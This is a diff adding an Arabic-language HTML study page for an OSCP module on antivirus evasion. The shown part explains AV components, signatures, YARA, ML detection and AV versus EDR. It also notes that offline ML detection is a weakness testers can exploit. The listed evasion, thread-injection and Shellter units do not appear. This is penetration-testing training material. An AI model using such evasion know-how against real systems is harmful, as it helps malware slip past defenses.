@@ -1,0 +1,1109 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>OSCP · Module 12: التحايل على مكافحة الفيروسات</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<style>
+  :root{
+    --bg-0: #0B0B0D;
+    --bg-1: #121214;
+    --surface: #17171A;
+    --surface-2: #1D1D21;
+    --border: #2A2A2F;
+    --border-soft: #232326;
+    --text: #E6E6E9;
+    --text-soft: #C4C4CA;
+    --muted: #8A8A92;
+    --red: #E1362F;
+    --red-soft: rgba(225,54,47,0.10);
+    --red-border: rgba(225,54,47,0.35);
+    --red-grad: linear-gradient(90deg, #E1362F, #F2794A);
+    --amber: #E8A23A;
+    --amber-soft: rgba(232,162,58,0.09);
+    --amber-border: rgba(232,162,58,0.30);
+    --green: #3FBF6E;
+    --green-soft: rgba(63,191,110,0.09);
+    --green-border: rgba(63,191,110,0.30);
+    --blue: #4EA1D3;
+    --blue-soft: rgba(78,161,211,0.09);
+    --blue-border: rgba(78,161,211,0.30);
+    --purple: #A179E8;
+    --purple-soft: rgba(161,121,232,0.10);
+    --purple-border: rgba(161,121,232,0.32);
+    --mono: 'IBM Plex Mono', 'Courier New', monospace;
+  }
+  html[data-theme="light"]{
+    --bg-0: #F4F3F1;
+    --bg-1: #ECEBE8;
+    --surface: #FFFFFF;
+    --surface-2: #F3F2EF;
+    --border: #DEDCD6;
+    --border-soft: #E6E4DF;
+    --text: #1C1B19;
+    --text-soft: #3C3A36;
+    --muted: #726F68;
+  }
+  * { box-sizing: border-box; }
+  html, body { margin: 0; padding: 0; direction: rtl; text-align: right; background: var(--bg-0); }
+  body {
+    font-family: 'Cairo', 'Segoe UI', Tahoma, sans-serif;
+    line-height: 1.95; font-size: 16.5px; color: var(--text);
+    background:
+      radial-gradient(900px 420px at 12% -8%, rgba(225,54,47,0.10), transparent 60%),
+      radial-gradient(800px 420px at 90% 6%, rgba(232,162,58,0.06), transparent 60%),
+      linear-gradient(180deg, var(--bg-0) 0%, var(--bg-1) 100%);
+    background-attachment: fixed;
+    transition: background 0.2s ease, color 0.2s ease;
+  }
+  html[data-theme="light"] body{
+    background:
+      radial-gradient(900px 420px at 12% -8%, rgba(225,54,47,0.06), transparent 60%),
+      radial-gradient(800px 420px at 90% 6%, rgba(232,162,58,0.05), transparent 60%),
+      linear-gradient(180deg, var(--bg-0) 0%, var(--bg-1) 100%);
+  }
+  .progress-rail{ position: fixed; top:0; inset-inline:0; height: 3px; background: rgba(255,255,255,0.04); z-index: 60; }
+  html[data-theme="light"] .progress-rail{ background: rgba(0,0,0,0.05); }
+  .progress-bar{ height: 100%; width: 0%; background: var(--red-grad); transition: width 0.08s linear; }
+  .float-controls{ position: fixed; bottom: 22px; left: 22px; z-index: 55; display: flex; flex-direction: column; gap: 10px; }
+  .fctrl-btn{
+    width: 42px; height: 42px; border-radius: 50%;
+    background: var(--surface); border: 1px solid var(--border);
+    color: var(--text-soft); display:flex; align-items:center; justify-content:center;
+    cursor: pointer; font-size: 16px; box-shadow: 0 10px 24px -10px rgba(0,0,0,0.5);
+    transition: transform 0.15s ease, border-color 0.15s ease, opacity 0.2s ease;
+  }
+  .fctrl-btn:hover{ transform: translateY(-2px); border-color: var(--red-border); color: var(--red); }
+  #toTop{ opacity: 0; pointer-events: none; }
+  #toTop.show{ opacity: 1; pointer-events: auto; }
+  .page { max-width: 860px; margin: 0 auto; padding: 46px 22px 100px; }
+  .banner {
+    position: relative; overflow: hidden;
+    background: linear-gradient(155deg, var(--surface) 0%, var(--bg-1) 55%, var(--surface) 100%);
+    border: 1px solid var(--border-soft); border-radius: 10px;
+    padding: 0 0 34px; margin-bottom: 26px;
+    box-shadow: 0 20px 50px -20px rgba(0,0,0,0.6);
+  }
+  .term-bar {
+    display: flex; align-items: center; gap: 8px;
+    padding: 13px 18px; border-bottom: 1px solid var(--border-soft);
+    background: rgba(255,255,255,0.015); direction: ltr;
+  }
+  .term-dot { width: 11px; height: 11px; border-radius: 50%; display: inline-block; }
+  .term-dot.r { background: #E1362F; }
+  .term-dot.y { background: #E8A23A; }
+  .term-dot.g { background: #3FBF6E; }
+  .term-path { margin-inline-start: 12px; font-family: var(--mono); font-size: 12px; color: var(--muted); }
+  .theme-switch{
+    margin-inline-start: auto; font-family: var(--mono); font-size: 11px; color: var(--muted);
+    background: transparent; border: 1px solid var(--border); border-radius: 4px;
+    padding: 4px 9px; cursor: pointer;
+  }
+  .theme-switch:hover{ color: var(--amber); border-color: var(--amber-border); }
+  .banner-body { padding: 30px 34px 4px; }
+  .banner .kicker {
+    display: inline-block; font-family: var(--mono); font-size: 12.5px; letter-spacing: 0.03em;
+    color: var(--red); background: var(--red-soft); border: 1px solid var(--red-border);
+    border-radius: 3px; padding: 5px 12px; margin-bottom: 20px; direction: ltr;
+  }
+  .banner h1 { margin: 0 0 14px; font-size: 28px; font-weight: 800; line-height: 1.5; color: var(--text); }
+  .banner .lede { color: var(--muted); font-size: 15.5px; line-height: 1.95; max-width: 640px; margin: 0 0 24px; }
+  .tags { display: flex; flex-wrap: wrap; gap: 9px; }
+  .tag { font-size: 12.5px; font-family: var(--mono); color: var(--amber); background: var(--amber-soft); border: 1px solid var(--amber-border); border-radius: 3px; padding: 5px 11px; }
+  .toc { background: var(--surface); border: 1px solid var(--border-soft); border-radius: 8px; padding: 6px 0 6px; margin-bottom: 50px; overflow: hidden; }
+  .toc-title { font-family: var(--mono); font-weight: 600; font-size: 13px; color: var(--green); padding: 14px 22px; border-bottom: 1px solid var(--border-soft); direction: ltr; text-align: left; }
+  .toc-list { display: flex; flex-direction: column; }
+  .toc-item { display: flex; align-items: center; gap: 14px; padding: 12px 22px; color: var(--text-soft); text-decoration: none; font-size: 14.5px; border-bottom: 1px solid rgba(255,255,255,0.03); transition: background 0.15s ease; }
+  .toc-list .toc-item:last-child { border-bottom: none; }
+  .toc-item:hover { background: var(--red-soft); }
+  .toc-num { flex: none; font-family: var(--mono); font-size: 12.5px; font-weight: 600; color: #0F0F10; background: var(--red-grad); border-radius: 3px; padding: 3px 8px; direction: ltr; }
+  h1, h2, h3, h4 { font-weight: 700; }
+  h2 { display: flex; align-items: center; gap: 14px; font-size: 21px; margin: 66px 0 22px; padding-bottom: 16px; border-bottom: 1px solid var(--border-soft); color: var(--text); }
+  h2 .num { flex: none; font-family: var(--mono); font-size: 13px; font-weight: 700; color: #0F0F10; background: var(--red-grad); border-radius: 5px; padding: 7px 12px; direction: ltr; }
+  h2 .htext { line-height: 1.5; }
+  h3 { font-size: 17px; margin: 34px 0 14px; color: var(--red); display: flex; align-items: center; gap: 9px; }
+  h3::before { content: "#"; font-family: var(--mono); color: var(--amber); font-weight: 700; }
+  h4 { font-size: 14.8px; margin: 22px 0 10px; color: var(--text-soft); font-family: var(--mono); }
+  p { margin: 0 0 17px; color: var(--text); }
+  strong { color: var(--text); font-weight: 700; }
+  :root:not([data-theme="light"]) strong { color: #FBFBFC; }
+  a { color: var(--amber); text-decoration: none; border-bottom: 1px dashed var(--amber-border); }
+  hr { border: none; height: 1px; margin: 50px 0; background: linear-gradient(90deg, transparent, var(--border), transparent); }
+  ul, ol { margin: 0 0 18px; padding-inline-start: 24px; }
+  li { margin-bottom: 9px; color: var(--text); }
+  li::marker { color: var(--red); font-family: var(--mono); }
+  li > ul, li > ol { margin-top: 9px; }
+  .goals-grid{ display: grid; grid-template-columns: repeat(auto-fit, minmax(230px, 1fr)); gap: 10px; margin: 0 0 22px; }
+  .goal-card{ display:flex; gap: 10px; align-items:flex-start; background: var(--surface); border: 1px solid var(--border-soft); border-radius: 7px; padding: 13px 15px; font-size: 14px; color: var(--text-soft); }
+  .goal-card .gi{ flex: none; font-family: var(--mono); font-size: 11px; font-weight: 700; color: var(--green); background: var(--green-soft); border: 1px solid var(--green-border); border-radius: 4px; width: 22px; height: 22px; display:flex; align-items:center; justify-content:center; }
+  blockquote { margin: 24px 0; padding: 17px 22px; background: var(--red-soft); border: 1px solid var(--red-border); border-inline-start: 3px solid var(--red); border-radius: 6px; color: var(--text-soft); }
+  blockquote p { margin: 0; color: inherit; line-height: 1.85; }
+  blockquote p + p{ margin-top: 10px; }
+  blockquote strong { color: var(--text); }
+  .callout{ margin: 24px 0; padding: 17px 22px 18px; border-radius: 6px; border: 1px solid var(--border-soft); border-inline-start: 3px solid var(--border); background: var(--surface); }
+  .callout p{ margin: 0; color: var(--text-soft); line-height: 1.85; }
+  .callout p + p{ margin-top: 10px; }
+  .callout-label{ display:inline-flex; align-items:center; gap: 7px; font-family: var(--mono); font-size: 11.5px; font-weight: 700; letter-spacing: 0.02em; text-transform: uppercase; margin-bottom: 10px; direction: ltr; }
+  .callout.note{ border-inline-start-color: var(--blue); background: var(--blue-soft); }
+  .callout.note .callout-label{ color: var(--blue); }
+  .callout.warning{ border-inline-start-color: var(--red); background: var(--red-soft); }
+  .callout.warning .callout-label{ color: var(--red); }
+  .callout.tip{ border-inline-start-color: var(--green); background: var(--green-soft); }
+  .callout.tip .callout-label{ color: var(--green); }
+  .callout.examtip{ border-inline-start-color: var(--purple); background: var(--purple-soft); }
+  .callout.examtip .callout-label{ color: var(--purple); }
+  .callout.case{ border-inline-start-color: var(--amber); background: var(--amber-soft); }
+  .callout.case .callout-label{ color: var(--amber); }
+  .callout.definition{ border-inline-start-color: var(--muted); background: var(--surface-2); }
+  .callout.definition .callout-label{ color: var(--text-soft); }
+  .callout.danger{ border-inline-start-color: #FF5A52; background: rgba(255,90,82,0.08); }
+  .callout.danger .callout-label{ color: #FF5A52; }
+  .table-wrap { overflow-x: auto; margin: 22px 0; border: 1px solid var(--border-soft); border-radius: 8px; }
+  table { width: 100%; border-collapse: collapse; font-size: 14.2px; min-width: 480px; }
+  thead th { background: var(--surface-2); color: var(--amber); font-weight: 700; font-family: var(--mono); font-size: 12.5px; text-transform: uppercase; letter-spacing: 0.02em; text-align: start; padding: 13px 15px; border-bottom: 1px solid var(--border-soft); white-space: nowrap; }
+  tbody td { padding: 12px 15px; border-bottom: 1px solid var(--border-soft); color: var(--text-soft); vertical-align: top; }
+  tbody tr:last-child td { border-bottom: none; }
+  tbody tr:nth-child(even) { background: rgba(127,127,127,0.03); }
+  tbody tr:hover { background: var(--red-soft); }
+  code { font-family: var(--mono); font-size: 13.3px; background: var(--surface-2); border: 1px solid var(--border-soft); border-radius: 4px; padding: 2px 6px; direction: ltr; unicode-bidi: embed; color: var(--green); }
+  .code-wrap { position: relative; overflow-x: auto; margin: 22px 0; }
+  .code-tag{ position: absolute; top: 10px; left: 14px; font-family: var(--mono); font-size: 10.5px; color: var(--muted); letter-spacing: 0.04em; text-transform: uppercase; z-index: 2; }
+  .copy-btn{ position: absolute; top: 8px; right: 10px; z-index: 2; font-family: var(--mono); font-size: 11px; color: var(--muted); background: var(--surface-2); border: 1px solid var(--border-soft); border-radius: 4px; padding: 4px 9px; cursor: pointer; direction: ltr; }
+  .copy-btn:hover{ color: var(--amber); border-color: var(--amber-border); }
+  .copy-btn.copied{ color: var(--green); border-color: var(--green-border); }
+  pre { background: var(--bg-0); border: 1px solid var(--border-soft); border-inline-start: 3px solid var(--red); border-radius: 8px; padding: 30px 22px 18px; direction: ltr; text-align: left; margin: 0; }
+  html[data-theme="light"] pre{ background: #16181C; }
+  pre code { background: none; border: none; padding: 0; color: #B9E8C9; font-size: 13.2px; line-height: 1.75; }
+  .diagram-card{ background: var(--surface); border: 1px solid var(--border-soft); border-radius: 10px; padding: 22px 18px 16px; margin: 24px 0; }
+  .diagram-card svg{ width: 100%; height: auto; display:block; }
+  .diagram-caption{ margin-top: 10px; text-align:center; font-family: var(--mono); font-size: 11.5px; color: var(--muted); }
+  .takeaways{ background: var(--surface); border: 1px solid var(--border-soft); border-radius: 8px; padding: 18px 22px 20px; margin: 30px 0 10px; }
+  .takeaways-title{ font-family: var(--mono); font-size: 12.5px; font-weight: 700; color: var(--green); margin-bottom: 12px; direction: ltr; text-align:left; display:flex; align-items:center; gap: 8px; }
+  .takeaways ul{ margin: 0; padding-inline-start: 20px; }
+  .takeaways li{ color: var(--text-soft); font-size: 14.5px; }
+  .cheat-section h4{ color: var(--amber); font-size: 13px; margin: 26px 0 8px; }
+  .step-track{ display: flex; flex-direction: column; gap: 0; margin: 24px 0; }
+  .step-item{ position: relative; padding: 0 0 26px 0; padding-inline-start: 46px; border-inline-start: 2px solid var(--border-soft); }
+  .step-item:last-child{ border-inline-start: 2px solid transparent; padding-bottom: 4px; }
+  .step-num{ position: absolute; inset-inline-start: -17px; top: 0; width: 32px; height: 32px; border-radius: 50%; background: var(--red-grad); color: #0F0F10; font-family: var(--mono); font-weight: 700; font-size: 13px; display:flex; align-items:center; justify-content:center; }
+  .step-title{ font-weight: 700; color: var(--text); margin-bottom: 6px; font-size: 15px; }
+  .step-body{ color: var(--text-soft); font-size: 14.5px; }
+  .step-body p{ margin: 0 0 10px; }
+  .step-body p:last-child{ margin-bottom: 0; }
+  .method-grid{ display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 10px; margin: 22px 0; }
+  .method-card{ background: var(--surface); border: 1px solid var(--border-soft); border-radius: 8px; padding: 14px 16px; }
+  .method-card .mnum{ font-family: var(--mono); font-size: 11px; font-weight: 700; color: #0F0F10; background: var(--red-grad); border-radius: 4px; padding: 2px 8px; display: inline-block; margin-bottom: 8px; direction: ltr; }
+  .method-card .mtitle{ font-weight: 700; color: var(--text); font-size: 14px; margin-bottom: 5px; }
+  .method-card .mdesc{ color: var(--text-soft); font-size: 13.3px; line-height: 1.75; }
+  .footer-note { margin-top: 70px; padding-top: 26px; border-top: 1px solid var(--border-soft); color: var(--muted); font-size: 13.3px; font-family: var(--mono); text-align: center; direction: ltr; }
+
+  /* ── SVG diagram theme helpers ── */
+  .dsvg-box   { fill: var(--surface-2); stroke: var(--border-soft); stroke-width: 1; }
+  .dsvg-box-r { fill: var(--red-soft); stroke: var(--red-border); stroke-width: 1; }
+  .dsvg-box-g { fill: var(--green-soft); stroke: var(--green-border); stroke-width: 1; }
+  .dsvg-box-b { fill: var(--blue-soft); stroke: var(--blue-border); stroke-width: 1; }
+  .dsvg-box-a { fill: var(--amber-soft); stroke: var(--amber-border); stroke-width: 1; }
+  .dsvg-box-p { fill: var(--purple-soft); stroke: var(--purple-border); stroke-width: 1; }
+  .dsvg-line  { stroke: var(--border); stroke-width: 1.5; fill: none; }
+  .dsvg-arr   { fill: var(--border); }
+  .dsvg-txt   { fill: var(--text); font-family: IBM Plex Mono, monospace; }
+  .dsvg-muted { fill: var(--muted); font-family: IBM Plex Mono, monospace; }
+  .dsvg-red   { fill: var(--red); }
+  .dsvg-green { fill: var(--green); }
+  .dsvg-amber { fill: var(--amber); }
+  .dsvg-blue  { fill: var(--blue); }
+
+  @media print { .float-controls, .progress-rail, .copy-btn, .theme-switch { display: none !important; } body{ background: #fff; color: #000; } .page{ max-width: 100%; } }
+  @media (max-width: 640px) { .page { padding: 28px 14px 70px; } .banner-body { padding: 24px 20px 4px; } .banner h1 { font-size: 21px; } h2 { font-size: 18px; gap: 10px; } .float-controls{ left: 12px; bottom: 14px; } }
+</style>
+</head>
+<body>
+
+<div class="progress-rail"><div class="progress-bar" id="progressBar"></div></div>
+<div class="float-controls">
+  <button class="fctrl-btn" id="toTop" title="ارجع لفوق" aria-label="ارجع لفوق">↑</button>
+</div>
+
+<div class="page">
+
+<div class="banner">
+  <div class="term-bar">
+    <span class="term-dot r"></span><span class="term-dot y"></span><span class="term-dot g"></span>
+    <span class="term-path">root@oscp:~/module-12$</span>
+    <button class="theme-switch" id="themeSwitch">theme: dark</button>
+  </div>
+  <div class="banner-body">
+    <span class="kicker">OSCP · PEN-200 · Module 12</span>
+    <h1>التحايل على برامج مكافحة الفيروسات (Antivirus Evasion)</h1>
+    <p class="lede">إزاي تفهم من جوه كيف الـ AV بيشتغل — مكوّناته، محركاته، وأساليب الكشف اللي بيستخدمها — وبعدين إزاي تتجاوزه بتقنيات القرص والذاكرة، مع تطبيق عملي بـ Thread Injection وأتمتة بـ Shellter.</p>
+    <div class="tags">
+      <span class="tag">antivirus-evasion</span>
+      <span class="tag">thread-injection</span>
+      <span class="tag">shellter</span>
+      <span class="tag">fileless-malware</span>
+      <span class="tag">on-disk-evasion</span>
+      <span class="tag">in-memory-evasion</span>
+      <span class="tag">powershell</span>
+    </div>
+  </div>
+</div>
+
+<nav class="toc"><div class="toc-title">$ ls learning_units/</div><div class="toc-list">
+  <a class="toc-item" href="#intro"><span class="toc-num">00</span><span class="toc-label">مقدمة: ليه بندرس التحايل على الـ AV</span></a>
+  <a class="toc-item" href="#lu1"><span class="toc-num">01</span><span class="toc-label">مكوّنات وآلية عمل برامج الحماية</span></a>
+  <a class="toc-item" href="#lu2"><span class="toc-num">02</span><span class="toc-label">التهديدات المعروفة مقابل غير المعروفة</span></a>
+  <a class="toc-item" href="#lu3"><span class="toc-num">03</span><span class="toc-label">محركات ومكونات الـ Antivirus الداخلية</span></a>
+  <a class="toc-item" href="#lu4"><span class="toc-num">04</span><span class="toc-label">أساليب الكشف عن التهديدات</span></a>
+  <a class="toc-item" href="#lu5"><span class="toc-num">05</span><span class="toc-label">نظرة عامة على تقنيات التحايل</span></a>
+  <a class="toc-item" href="#lu6"><span class="toc-num">06</span><span class="toc-label">تقنيات التحايل على القرص (On-Disk)</span></a>
+  <a class="toc-item" href="#lu7"><span class="toc-num">07</span><span class="toc-label">تقنيات التحايل في الذاكرة (In-Memory)</span></a>
+  <a class="toc-item" href="#lu8"><span class="toc-num">08</span><span class="toc-label">اختبار فاعلية التحايل وبيئة الاختبار</span></a>
+  <a class="toc-item" href="#lu9"><span class="toc-num">09</span><span class="toc-label">Thread Injection — تطبيق عملي بـ PowerShell</span></a>
+  <a class="toc-item" href="#lu10"><span class="toc-num">10</span><span class="toc-label">أتمتة التحايل باستخدام Shellter</span></a>
+  <a class="toc-item" href="#cheat"><span class="toc-num">--</span><span class="toc-label">Cheat Sheet مرجعي</span></a>
+  <a class="toc-item" href="#summary"><span class="toc-num">--</span><span class="toc-label">الخلاصة العامة للموديول</span></a>
+</div></nav>
+
+<!-- ═══════════════════════════════════════════════════ INTRO -->
+<h1 id="intro">Module 12: التحايل على مكافحة الفيروسات</h1>
+<p>الموديول ده اتنظَّم حوالين ثلاث محاور رئيسية:</p>
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span>المكوّنات الأساسية ووظائف برامج الحماية من البرامج الخبيثة</span></div>
+  <div class="goal-card"><span class="gi">2</span><span>تقنيات التحايل على آليات الكشف الدفاعية</span></div>
+  <div class="goal-card"><span class="gi">3</span><span>التطبيق العملي لأساليب تهرّب من الدفاعات</span></div>
+</div>
+<p>من منظور مختبر الاختراق المحترف: فهم كيف الـ AV بيشتغل من جوه هو الخطوة الأولى قبل أي محاولة للتحايل عليه. الهدف مش الاختراق العشوائي، بل إثبات نقاط ضعف حقيقية لأصحاب المصلحة في إطار تقييمات مرخَّصة وآمنة.</p>
+
+<div class="callout warning">
+<div class="callout-label">⚠ Legal Scope</div>
+<p>كل التقنيات في الموديول ده لازم تتطبَّق فقط في بيئات لاب متحكَّم فيها أو في إطار engagement مرخَّص رسمياً. استخدامها بدون إذن يعتبر جريمة إلكترونية في معظم الدول.</p>
+</div>
+
+<hr />
+
+<!-- ═══════════════════════════════════════════════════ LU1 -->
+<h2 id="lu1"><span class="num">01</span><span class="htext">مكوّنات وآلية عمل برامج الحماية</span></h2>
+<h3>أهداف الوحدة</h3>
+<div class="goals-grid">
+  <div class="goal-card"><span class="gi">1</span><span>التمييز بين التهديدات المعروفة وغير المعروفة</span></div>
+  <div class="goal-card"><span class="gi">2</span><span>تحديد المكوّنات الأساسية لبرامج الحماية الحديثة</span></div>
+  <div class="goal-card"><span class="gi">3</span><span>شرح كيفية عمل محركات الفحص والتحليل الداخلية</span></div>
+</div>
+
+<h3>تعريف الـ Antivirus وتطوّره</h3>
+<p>برامج مكافحة الفيروسات هي تطبيقات أمنية صُمِّمت لمنع البرامج الخبيثة والكشف عنها وإزالتها. في بدايتها كانت بتركّز على الفيروسات التقليدية بس — لكن مع تطوّر التهديدات كشبكات الـ Botnet وبرامج الفدية (Ransomware)، توسّعت قدراتها بشكل كبير.</p>
+
+<div class="callout note">
+<div class="callout-label">📌 تطوّر الحماية</div>
+<p>الـ AV الحديث مش بس بيمسح الملفات. بقى بيضم: مراقبة الترافيك على غرار الـ IDS/IPS، جدار حماية مدمج، فلترة الويب وتحليل الـ URLs، حماية البريد الإلكتروني، ومراقبة سلوكية مستمرة للعمليات الجارية.</p>
+</div>
+
+<p>برامج الحماية المعاصرة بتجمع طبقات متعددة في منصة واحدة — وده بيخلّي التحايل عليها أصعب من مجرد تعديل ملف.</p>
+
+<hr />
+
+<!-- ═══════════════════════════════════════════════════ LU2 -->
+<h2 id="lu2"><span class="num">02</span><span class="htext">التهديدات المعروفة مقابل غير المعروفة</span></h2>
+
+<h3>مفهوم التوقيع (Signature)</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ Definition</div>
+<p><strong>التوقيع (Signature)</strong> هو نمط مميّز بيُستخدم للتعرّف بشكل فريد على برنامج خبيث محدد. ممكن يكون: بصمة رقمية (Hash) كاملة للملف، تسلسل bytes محدد داخل الكود، أو strings نصية مميّزة مضمَّنة في الكود.</p>
+</div>
+<p>كل محرك كشف غالبًا بيعتمد على صيغة قواعده الخاصة — لذلك التهديد الواحد ممكن يكون ليه توقيعات متعددة، كل واحدة مصمَّمة لسياق تحليل مختلف. مثلاً: توقيع لاكتشاف الملف على القرص، وتوقيع تاني للترافيك اللي الـ malware بيولّده على الشبكة.</p>
+
+<h3>إطار عمل YARA</h3>
+<div class="callout definition">
+<div class="callout-label">⬦ YARA Framework</div>
+<p><strong>YARA</strong>: إطار عمل معياري مفتوح المصدر بيسمح للمحللين بوصف خصائص البرامج الخبيثة باستخدام قواعد مرنة، والبحث عن عيّنات مطابقة عبر مجموعات بيانات ضخمة. بيُستخدم على نطاق واسع مع منصة <strong>VirusTotal</strong> اللي بتجمع عشرات محركات الكشف.</p>
+</div>
+
+<h3>الكشف باستخدام Machine Learning</h3>
+<p>لأن الكشف القائم على التوقيعات محدود بالتهديدات المُحلَّلة مسبقًا، الحلول الحديثة — زي Microsoft Defender — بتدمج نماذج تعلّم آلي بتقيّم الملفات المشبوهة حتى في غياب أي توقيع مطابق. النماذج دي بتحلّل: أنماط السلوك، البنية الداخلية، والتشابه مع تهديدات معروفة.</p>
+
+<div class="callout tip">
+<div class="callout-label">✓ نقطة مهمة</div>
+<p>الكشف بالـ ML غالبًا بيعتمد على خدمات سحابية — يعني في البيئات المعزولة (Isolated Networks) قدرته بتقلّ بشكل ملحوظ. ده نقطة ضعف ممكن تستغلّها وانت بتقيّم بيئة هدف.</p>
+</div>
+
+<h3>AV مقابل EDR — المقارنة الكاملة</h3>
+<div class="table-wrap"><table>
+<thead><tr><th>المعيار</th><th>Antivirus (AV)</th><th>EDR — Endpoint Detection & Response</th></tr></thead>
+<tbody>
+<tr><td>الهدف الرئيسي</td><td>منع التهديدات (Prevention)</td><td>الكشف والاستجابة (Detection & Response)</td></tr>
+<tr><td>طريقة العمل</td><td>فحص الملفات آنياً</td><td>جمع بيانات تفصيلية مستمرة من الـ Endpoints</td></tr>
+<tr><td>البيانات المُجمَّعة</td><td>محدودة (الملف المشبوه فقط)</td><td>كل أنشطة العملية، الشبكة، والنظام</td></tr>
+<tr><td>التحليل</td><td>محلي وفوري</td><td>SIEM بيحلّل ويربط الأحداث ببعض</td></tr>
+<tr><td>إعادة بناء الهجوم</td><td>غير متاح</td><td>متاح — بيعيد بناء timeline الهجوم كامل</td></tr>
+<tr><td>ميزة إضافية</td><td>الاستجابة الفورية للملفات الخبيثة</td><td>بعض الـ EDRs بيضم ميزات منع مدمجة</td></tr>
+</tbody>
+</table></div>
+
+<blockquote>
+<p><strong>الـ AV والـ EDR مش بديلين لبعض — بيكمّلوا بعض.</strong> الـ AV بيوفّر حماية أمامية ضد الـ malware المعروف، والـ EDR بيوفّر رؤية عميقة وقدرة استجابة للهجمات المتطوّرة.</p>
+</blockquote>
+
+<hr />
+
+<!-- ═══════════════════════════════════════════════════ LU3 -->
+<h2 id="lu3"><span class="num">03</span><span class="htext">محركات ومكونات الـ Antivirus الداخلية</span></h2>
+<p>قلب الـ AV الحديث هو آلية تحديث مستمرة بتجيب تعريفات الكشف من مستودع المورّد الإلكتروني، وبتخزّنها محليًا عشان تغذّي المحركات المتخصّصة المختلفة.</p>
+
+<div class="method-grid">
+<div class="method-card"><span class="mnum">01</span><div class="mtitle">📁 File Analysis Module</div><div class="mdesc">بيتولّى الفحص الدوري الكامل للقرص والمراقبة اللحظية للملفات الجديدة أو المعدَّلة. بيشتغل في User Space وKernel Space للوصول لكل أحداث النظام.</div></div>
+<div class="method-card"><span class="mnum">02</span><div class="mtitle">🧠 Memory Inspection Module</div><div class="mdesc">بيفحص الذاكرة الحية للعمليات الجارية بدل الملفات على القرص. ده بالتحديد مهم جداً لاكتشاف الـ malware اللي بيشتغل في الذاكرة بس (Fileless).</div></div>
+<div class="method-card"><span class="mnum">03</span><div class="mtitle">🌐 Network Monitoring Module</div><div class="mdesc">بيراقب الترافيك الداخل والخارج من الـ Network Interfaces. لما بيكتشف اتصال مشبوه بيقدر يحجبه لمنع التواصل مع خوادم التحكّم (C2) أو تسريب البيانات.</div></div>
+<div class="method-card"><span class="mnum">04</span><div class="mtitle">🔍 Code Analysis (Disassembly)</div><div class="mdesc">بيترجم تعليمات الـ Machine Code لـ Assembly قابل للقراءة عشان يكتشف الـ Packers والـ Obfuscators والـ Decryption Stubs المخبية.</div></div>
+<div class="method-card"><span class="mnum">05</span><div class="mtitle">🧪 Sandbox / Emulator</div><div class="mdesc">بيشغّل البرنامج المشبوه في بيئة افتراضية معزولة عشان يراقب سلوكه بأمان. لما الكود المخبي بيتنفَّذ جوّا الـ sandbox، بيتحلَّل مقابل قواعد الكشف السلوكية.</div></div>
+<div class="method-card"><span class="mnum">06</span><div class="mtitle">🌍 Browser Extension</div><div class="mdesc">بيتكامل مع المتصفح لمراقبة الـ Scripts والتنزيلات وسلوك الصفحات — لأن كتير من التهديدات بتيجي من محتوى الويب اللي بيكون معزول عن باقي النظام.</div></div>
+<div class="method-card"><span class="mnum">07</span><div class="mtitle">🤖 AI / Machine Learning Module</div><div class="mdesc">بيحلّل أنماط وخصائص وسلوكيات — غالبًا بمساعدة موارد سحابية — لاتخاذ قرارات حتى في غياب توقيعات مسبقة. بيكون فعّال جداً ضد التهديدات غير المعروفة.</div></div>
+</div>
+
+<h3>كيف المحركات بتشتغل مع بعض</h3>
+<div class="diagram-card">
+<svg viewBox="0 0 700 260" xmlns="http://www.w3.org/2000/svg">
+  <!-- Input -->
+  <rect x="8" y="85" width="110" height="55" rx="7" class="dsvg-box-a"/>
+  <text x="63" y="108" text-anchor="middle" class="dsvg-txt" font-size="11" font-weight="700">ملف / عملية</text>
+  <text x="63" y="125" text-anchor="middle" class="dsvg-muted" font-size="10">مشبوهة</text>
+  <!-- Arrow 1 -->
+  <line x1="118" y1="112" x2="152" y2="112" class="dsvg-line"/>
+  <polygon points="152,107 162,112 152,117" class="dsvg-arr"/>
+  <!-- Engines box -->
+  <rect x="162" y="8" width="360" height="215" rx="8" class="dsvg-box"/>
+  <text x="342" y="28" text-anchor="middle" class="dsvg-muted" font-size="10">AV ENGINES</text>
+  <!-- Engine rows -->
+  <rect x="175" y="36" width="334" height="28" rx="4" class="dsvg-box-b"/>
+  <text x="342" y="55" text-anchor="middle" class="dsvg-blue" font-size="11">📁  File Analysis Module</text>
+  <rect x="175" y="70" width="334" height="28" rx="4" class="dsvg-box-b"/>
+  <text x="342" y="89" text-anchor="middle" class="dsvg-blue" font-size="11">🧠  Memory Inspection Module</text>
+  <rect x="175" y="104" width="334" height="28" rx="4" class="dsvg-box-b"/>
+  <text x="342" y="123" text-anchor="middle" class="dsvg-blue" font-size="11">🌐  Network Monitoring Module</text>
+  <rect x="175" y="138" width="334" height="28" rx="4" class="dsvg-box-b"/>
+  <text x="342" y="157" text-anchor="middle" class="dsvg-blue" font-size="11">🧪  Sandbox / Emulator</text>
+  <rect x="175" y="172" width="334" height="28" rx="4" class="dsvg-box-p"/>
+  <text x="342" y="191" text-anchor="middle" class="dsvg-txt" font-size="11" style="fill:var(--purple)">🤖  AI / ML Module</text>
+  <!-- Arrow 2 -->
+  <line x1="522" y1="112" x2="556" y2="112" class="dsvg-line"/>
+  <polygon points="556,107 566,112 556,117" class="dsvg-arr"/>
+  <!-- Decision boxes -->
+  <rect x="566" y="50" width="120" height="30" rx="5" class="dsvg-box-g"/>
+  <text x="626" y="70" text-anchor="middle" class="dsvg-green" font-size="11" font-weight="700">✓ آمن</text>
+  <rect x="566" y="97" width="120" height="30" rx="5" class="dsvg-box-a"/>
+  <text x="626" y="117" text-anchor="middle" class="dsvg-amber" font-size="11" font-weight="700">⚠ مشبوه</text>
+  <rect x="566" y="144" width="120" height="30" rx="5" class="dsvg-box-r"/>
+  <text x="626" y="164" text-anchor="middle" class="dsvg-red" font-size="11" font-weight="700">✗ مهدِّد</text>
+</svg>
+<div class="diagram-caption">كل المحركات بتشتغل بشكل متوازي وبتغذّي قرار واحد مجمَّع</div>
+</div>
+
+<hr />
+
